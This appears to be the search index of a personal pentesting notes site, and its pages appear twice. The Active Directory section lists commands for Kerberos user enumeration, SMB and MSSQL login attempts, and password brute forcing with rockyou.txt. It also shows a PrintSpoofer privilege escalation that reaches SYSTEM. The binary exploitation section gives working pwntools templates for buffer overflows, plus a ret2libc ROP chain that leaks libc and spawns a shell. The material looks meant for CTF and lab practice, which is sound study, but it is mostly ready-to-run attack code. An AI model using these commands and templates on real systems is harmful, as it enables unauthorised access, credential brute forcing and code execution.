{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Notekeeping Feel free to look around! Go check out my blog at sh4rks.thomashayen.com Windows Active Directory Binary Exploitation","title":"Home"},{"location":"#notekeeping","text":"Feel free to look around! Go check out my blog at sh4rks.thomashayen.com Windows Active Directory Binary Exploitation","title":"Notekeeping"},{"location":"ad/","text":"Windows Active Directory Kerberos Using Kerbrute: Github Kerbrute Repo # Userenum kerbrute userenum --dc <DC-NAME> -d <DOMAIN NAME> /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt SMB Enumerate SMB logins, crackmapexec, ... # Try to login to the guest account with null auth cme smb <DC-NAME> -u guest -p '' # Try RID brute forcing with an active account (guest) cme smb <DC-NAME> -u guest -p '' --rid-brute # Brute force password (Kerberos service account) cme smb dc.ustoun.local -u 'SVC-Kerb' -p /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt MSSSQL Enumerate MSSQL logins, crackmapexec, ... # Try a login with username and password with CME cme mssql <DC-NAME> -d <DOMAIN NAME> -u '<account>' -p '<password>' # Metasploit run commands knowing login msf6 auxiliary(admin/mssql/mssql_exec) > run # Impacket script login with creds mssqlclient.py <account>@<DC-IP> Exploiting Privileges SeImpersonatePrivilege Impersonate a client after authentication. Any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle. You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM. Exploit it with juicy-potato, RogueWinRM (needs winrm disabled), SweetPotato, PrintSpoofer. Printspoofer: releases c:\\sh4rks>pspoof.exe -c cmd -i pspoof.exe -c cmd -i [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK Microsoft Windows [Version 10.0.17763.737] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami dc01\\dc$","title":"Windows Active Directory"},{"location":"ad/#windows-active-directory","text":"","title":"Windows Active Directory"},{"location":"ad/#kerberos","text":"Using Kerbrute: Github Kerbrute Repo # Userenum kerbrute userenum --dc <DC-NAME> -d <DOMAIN NAME> /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt","title":"Kerberos"},{"location":"ad/#smb","text":"Enumerate SMB logins, crackmapexec, ... # Try to login to the guest account with null auth cme smb <DC-NAME> -u guest -p '' # Try RID brute forcing with an active account (guest) cme smb <DC-NAME> -u guest -p '' --rid-brute # Brute force password (Kerberos service account) cme smb dc.ustoun.local -u 'SVC-Kerb' -p /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt","title":"SMB"},{"location":"ad/#msssql","text":"Enumerate MSSQL logins, crackmapexec, ... # Try a login with username and password with CME cme mssql <DC-NAME> -d <DOMAIN NAME> -u '<account>' -p '<password>' # Metasploit run commands knowing login msf6 auxiliary(admin/mssql/mssql_exec) > run # Impacket script login with creds mssqlclient.py <account>@<DC-IP>","title":"MSSSQL"},{"location":"ad/#exploiting-privileges","text":"","title":"Exploiting Privileges"},{"location":"ad/#seimpersonateprivilege","text":"Impersonate a client after authentication. Any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle. You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM. Exploit it with juicy-potato, RogueWinRM (needs winrm disabled), SweetPotato, PrintSpoofer. Printspoofer: releases c:\\sh4rks>pspoof.exe -c cmd -i pspoof.exe -c cmd -i [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK Microsoft Windows [Version 10.0.17763.737] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami dc01\\dc$","title":"SeImpersonatePrivilege"},{"location":"bin-exp/","text":"Binary Exploitation Checking out the binary file <binary> checksec <binary> readelf -a <binary> strings <binary> ltrace <binary> GDB Gef Find out how to install or use: https://gef.readthedocs.io/en/master/ gdb -q <binary-name> # main commands in gef to look around the binary gef> info functions gef> b <function-name> # breakpoint gef> disassemble <function-name> Pwndbg This has alot more features. For example: for stripped binaries, pivot to r2 -> % gdb-pwndbg <binary> pwndbg: loaded 194 commands. Type pwndbg [filter] for a list. pwndbg: created $rebase, $ida gdb functions (can be used with print/break) Reading symbols from <binary>... (No debugging symbols found in <binary>) Undefined command: \"init-pwndbg\". Try \"help\". pwndbg> r2 WARNING: No calling convention defined for this file, analysis may be inaccurate. [0x000010b0]> aa [x] Analyze all flags starting with sym. and entry0 (aa) [0x000010b0]> afl (snipped) 0x000011ec 8 308 main (snipped) [0x000010b0]> s main [0x000011ec]> pdf # disassemble PWNTOOLS pip install pwntools # Debugging context.log_level = 'debug' # Shellcode generate example shellcode = asm(shellcraft.sh()) # spawn /bin/bash shellcode = asm(shellcraft.popad()) # shellcode pop all regs Finding GOT, PLT and Offset addresses objdump -R <binary> # Finding main and puts_got objdump -d <binary> # Finding puts_plt ROPgadget --binary <binary> | grep \"pop rdi ; ret\" # To find ROP gadget objdump -d libc.so.6 | grep \"puts\" # To find puts libc offset More: To find gadget_offset , see https://github.com/david942j/one_gadget Templates Standard Template from pwn import * # Allows you to switch between local/GDB/remote from terminal def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw) # Find offset to EIP/RIP for buffer overflows def find_ip(payload): # Launch process and send payload p = process(exe) p.sendlineafter('>', payload) # Wait for the process to crash p.wait() # Print out the address of EIP/RIP at the time of crashing # ip_offset = cyclic_find(p.corefile.pc) # x86 ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64 info('located EIP/RIP offset at {a}'.format(a=ip_offset)) return ip_offset # Specify GDB script here (breakpoints etc) gdbscript = ''' init-pwndbg continue '''.format(**locals()) # Binary filename exe = './vuln' # This will automatically get context arch, bits, os etc elf = context.binary = ELF(exe, checksec=False) # Change logging level to help with debugging (warning/info/debug) context.log_level = 'info' # =========================================================== # EXPLOIT GOES HERE # =========================================================== # Pass in pattern_size, get back EIP/RIP offset offset = find_ip(cyclic(100)) # Start program io = start() # Build the payload payload = flat({ offset: [ ] }) # Save the payload to file write('payload', payload) # Send the payload io.sendlineafter('>', payload) io.recvuntil('Thank you!\\n') # Got Shell? io.interactive() # Or, Get our flag! # flag = io.recv() # success(flag) ROP Template from pwn import * #################### #### CONNECTION #### #################### LOCAL = True REMOTETTCP = False REMOTESSH = False GDB = False LOCAL_BIN = \"./vuln\" REMOTE_BIN = \"~/vuln\" #For ssh LIBC = \"\" #ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") #Set library path when know it if LOCAL: P = process(LOCAL_BIN) # start the vuln binary ELF_LOADED = ELF(LOCAL_BIN) # Extract data from binary ROP_LOADED = ROP(ELF_LOADED) # Find ROP gadgets elif REMOTETTCP: P = remote('10.10.10.10',1339) # start the vuln binary ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets elif REMOTESSH: ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220) p = ssh_shell.process(REMOTE_BIN) # start the vuln binary elf = ELF(LOCAL_BIN) # Extract data from binary rop = ROP(elf) # Find ROP gadgets if GDB and not REMOTETTCP and not REMOTESSH: # attach gdb and continue # You can set breakpoints, for example \"break *main\" gdb.attach(P.pid, \"b *main\") ########################## ##### OFFSET FINDER ###### ########################## OFFSET = b\"\" #b\"A\"*264 if OFFSET == b\"\": gdb.attach(P.pid, \"c\") #Attach and continue payload = cyclic(250) payload += b\"AAAAAAAA\" print(P.clean()) P.sendline(payload) #x/wx $rsp -- Search for bytes that crashed the application #print(cyclic_find(0x63616171)) # Find the offset of those bytes P.interactive() exit() ##################### #### Find Gadgets ### ##################### try: libc_func = \"puts\" PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols[\"puts\"] # This is also valid to call puts except: libc_func = \"printf\" PUTS_PLT = ELF_LOADED.plt['printf'] MAIN_PLT = ELF_LOADED.symbols['main'] POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep \"pop rdi\" RET = (ROP_LOADED.find_gadget(['ret']))[0] log.info(\"Main start: \" + hex(MAIN_PLT)) log.info(\"Puts plt: \" + hex(PUTS_PLT)) log.info(\"pop rdi; ret gadget: \" + hex(POP_RDI)) log.info(\"ret gadget: \" + hex(RET)) ######################### #### Find LIBC offset ### ######################### def generate_payload_aligned(rop): payload1 = OFFSET + rop if (len(payload1) % 16) == 0: return payload1 else: payload2 = OFFSET + p64(RET) + rop if (len(payload2) % 16) == 0: log.info(\"Payload aligned successfully\") return payload2 else: log.warning(f\"I couldn't align the payload! Len: {len(payload1)}\") return payload1 def get_addr(libc_func): FUNC_GOT = ELF_LOADED.got[libc_func] log.info(libc_func + \" GOT @ \" + hex(FUNC_GOT)) # Create rop chain rop1 = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT) rop1 = generate_payload_aligned(rop1) # Send our rop-chain payload #P.sendlineafter(\"dah?\", rop1) #Use this to send the payload when something is received print(P.clean()) # clean socket buffer (read all and print) P.sendline(rop1) # If binary is echoing back the payload, remove that message recieved = P.recvline().strip() if OFFSET[:30] in recieved: recieved = P.recvline().strip() # Parse leaked address log.info(f\"Len rop1: {len(rop1)}\") leak = u64(recieved.ljust(8, b\"\\x00\")) log.info(f\"Leaked LIBC address, {libc_func}: {hex(leak)}\") # Set lib base address if LIBC: LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base log.info(\"LIBC base @ %s\" % hex(LIBC.address)) # If not LIBC yet, stop here else: print(\"TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)\") P.interactive() return hex(leak) get_addr(libc_func) #Search for puts address in memmory to obtain LIBC base ############################## ##### FINAL EXPLOITATION ##### ############################## BINSH = next(LIBC.search(b\"/bin/sh\")) #Verify with find /bin/sh SYSTEM = LIBC.sym[\"system\"] EXIT = LIBC.sym[\"exit\"] log.info(\"POP_RDI %s \" % hex(POP_RDI)) log.info(\"bin/sh %s \" % hex(BINSH)) log.info(\"system %s \" % hex(SYSTEM)) log.info(\"exit %s \" % hex(EXIT)) rop2 = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) #p64(EXIT) rop2 = generate_payload_aligned(rop2) P.clean() P.sendline(rop2) P.interactive() #Interact with your shell :)","title":"Binary Exploitation"},{"location":"bin-exp/#binary-exploitation","text":"","title":"Binary Exploitation"},{"location":"bin-exp/#checking-out-the-binary","text":"file <binary> checksec <binary> readelf -a <binary> strings <binary> ltrace <binary>","title":"Checking out the binary"},{"location":"bin-exp/#gdb","text":"","title":"GDB"},{"location":"bin-exp/#gef","text":"Find out how to install or use: https://gef.readthedocs.io/en/master/ gdb -q <binary-name> # main commands in gef to look around the binary gef> info functions gef> b <function-name> # breakpoint gef> disassemble <function-name>","title":"Gef"},{"location":"bin-exp/#pwndbg","text":"This has alot more features. For example: for stripped binaries, pivot to r2 -> % gdb-pwndbg <binary> pwndbg: loaded 194 commands. Type pwndbg [filter] for a list. pwndbg: created $rebase, $ida gdb functions (can be used with print/break) Reading symbols from <binary>... (No debugging symbols found in <binary>) Undefined command: \"init-pwndbg\". Try \"help\". pwndbg> r2 WARNING: No calling convention defined for this file, analysis may be inaccurate. [0x000010b0]> aa [x] Analyze all flags starting with sym. and entry0 (aa) [0x000010b0]> afl (snipped) 0x000011ec 8 308 main (snipped) [0x000010b0]> s main [0x000011ec]> pdf # disassemble","title":"Pwndbg"},{"location":"bin-exp/#pwntools","text":"pip install pwntools # Debugging context.log_level = 'debug' # Shellcode generate example shellcode = asm(shellcraft.sh()) # spawn /bin/bash shellcode = asm(shellcraft.popad()) # shellcode pop all regs","title":"PWNTOOLS"},{"location":"bin-exp/#finding-got-plt-and-offset-addresses","text":"objdump -R <binary> # Finding main and puts_got objdump -d <binary> # Finding puts_plt ROPgadget --binary <binary> | grep \"pop rdi ; ret\" # To find ROP gadget objdump -d libc.so.6 | grep \"puts\" # To find puts libc offset More: To find gadget_offset , see https://github.com/david942j/one_gadget","title":"Finding GOT, PLT and Offset addresses"},{"location":"bin-exp/#templates","text":"","title":"Templates"},{"location":"bin-exp/#standard-template","text":"from pwn import * # Allows you to switch between local/GDB/remote from terminal def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw) # Find offset to EIP/RIP for buffer overflows def find_ip(payload): # Launch process and send payload p = process(exe) p.sendlineafter('>', payload) # Wait for the process to crash p.wait() # Print out the address of EIP/RIP at the time of crashing # ip_offset = cyclic_find(p.corefile.pc) # x86 ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64 info('located EIP/RIP offset at {a}'.format(a=ip_offset)) return ip_offset # Specify GDB script here (breakpoints etc) gdbscript = ''' init-pwndbg continue '''.format(**locals()) # Binary filename exe = './vuln' # This will automatically get context arch, bits, os etc elf = context.binary = ELF(exe, checksec=False) # Change logging level to help with debugging (warning/info/debug) context.log_level = 'info' # =========================================================== # EXPLOIT GOES HERE # =========================================================== # Pass in pattern_size, get back EIP/RIP offset offset = find_ip(cyclic(100)) # Start program io = start() # Build the payload payload = flat({ offset: [ ] }) # Save the payload to file write('payload', payload) # Send the payload io.sendlineafter('>', payload) io.recvuntil('Thank you!\\n') # Got Shell? io.interactive() # Or, Get our flag! # flag = io.recv() # success(flag)","title":"Standard Template"},{"location":"bin-exp/#rop-template","text":"from pwn import * #################### #### CONNECTION #### #################### LOCAL = True REMOTETTCP = False REMOTESSH = False GDB = False LOCAL_BIN = \"./vuln\" REMOTE_BIN = \"~/vuln\" #For ssh LIBC = \"\" #ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") #Set library path when know it if LOCAL: P = process(LOCAL_BIN) # start the vuln binary ELF_LOADED = ELF(LOCAL_BIN) # Extract data from binary ROP_LOADED = ROP(ELF_LOADED) # Find ROP gadgets elif REMOTETTCP: P = remote('10.10.10.10',1339) # start the vuln binary ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets elif REMOTESSH: ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220) p = ssh_shell.process(REMOTE_BIN) # start the vuln binary elf = ELF(LOCAL_BIN) # Extract data from binary rop = ROP(elf) # Find ROP gadgets if GDB and not REMOTETTCP and not REMOTESSH: # attach gdb and continue # You can set breakpoints, for example \"break *main\" gdb.attach(P.pid, \"b *main\") ########################## ##### OFFSET FINDER ###### ########################## OFFSET = b\"\" #b\"A\"*264 if OFFSET == b\"\": gdb.attach(P.pid, \"c\") #Attach and continue payload = cyclic(250) payload += b\"AAAAAAAA\" print(P.clean()) P.sendline(payload) #x/wx $rsp -- Search for bytes that crashed the application #print(cyclic_find(0x63616171)) # Find the offset of those bytes P.interactive() exit() ##################### #### Find Gadgets ### ##################### try: libc_func = \"puts\" PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols[\"puts\"] # This is also valid to call puts except: libc_func = \"printf\" PUTS_PLT = ELF_LOADED.plt['printf'] MAIN_PLT = ELF_LOADED.symbols['main'] POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep \"pop rdi\" RET = (ROP_LOADED.find_gadget(['ret']))[0] log.info(\"Main start: \" + hex(MAIN_PLT)) log.info(\"Puts plt: \" + hex(PUTS_PLT)) log.info(\"pop rdi; ret gadget: \" + hex(POP_RDI)) log.info(\"ret gadget: \" + hex(RET)) ######################### #### Find LIBC offset ### ######################### def generate_payload_aligned(rop): payload1 = OFFSET + rop if (len(payload1) % 16) == 0: return payload1 else: payload2 = OFFSET + p64(RET) + rop if (len(payload2) % 16) == 0: log.info(\"Payload aligned successfully\") return payload2 else: log.warning(f\"I couldn't align the payload! Len: {len(payload1)}\") return payload1 def get_addr(libc_func): FUNC_GOT = ELF_LOADED.got[libc_func] log.info(libc_func + \" GOT @ \" + hex(FUNC_GOT)) # Create rop chain rop1 = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT) rop1 = generate_payload_aligned(rop1) # Send our rop-chain payload #P.sendlineafter(\"dah?\", rop1) #Use this to send the payload when something is received print(P.clean()) # clean socket buffer (read all and print) P.sendline(rop1) # If binary is echoing back the payload, remove that message recieved = P.recvline().strip() if OFFSET[:30] in recieved: recieved = P.recvline().strip() # Parse leaked address log.info(f\"Len rop1: {len(rop1)}\") leak = u64(recieved.ljust(8, b\"\\x00\")) log.info(f\"Leaked LIBC address, {libc_func}: {hex(leak)}\") # Set lib base address if LIBC: LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base log.info(\"LIBC base @ %s\" % hex(LIBC.address)) # If not LIBC yet, stop here else: print(\"TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)\") P.interactive() return hex(leak) get_addr(libc_func) #Search for puts address in memmory to obtain LIBC base ############################## ##### FINAL EXPLOITATION ##### ############################## BINSH = next(LIBC.search(b\"/bin/sh\")) #Verify with find /bin/sh SYSTEM = LIBC.sym[\"system\"] EXIT = LIBC.sym[\"exit\"] log.info(\"POP_RDI %s \" % hex(POP_RDI)) log.info(\"bin/sh %s \" % hex(BINSH)) log.info(\"system %s \" % hex(SYSTEM)) log.info(\"exit %s \" % hex(EXIT)) rop2 = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) #p64(EXIT) rop2 = generate_payload_aligned(rop2) P.clean() P.sendline(rop2) P.interactive() #Interact with your shell :)","title":"ROP Template"}]}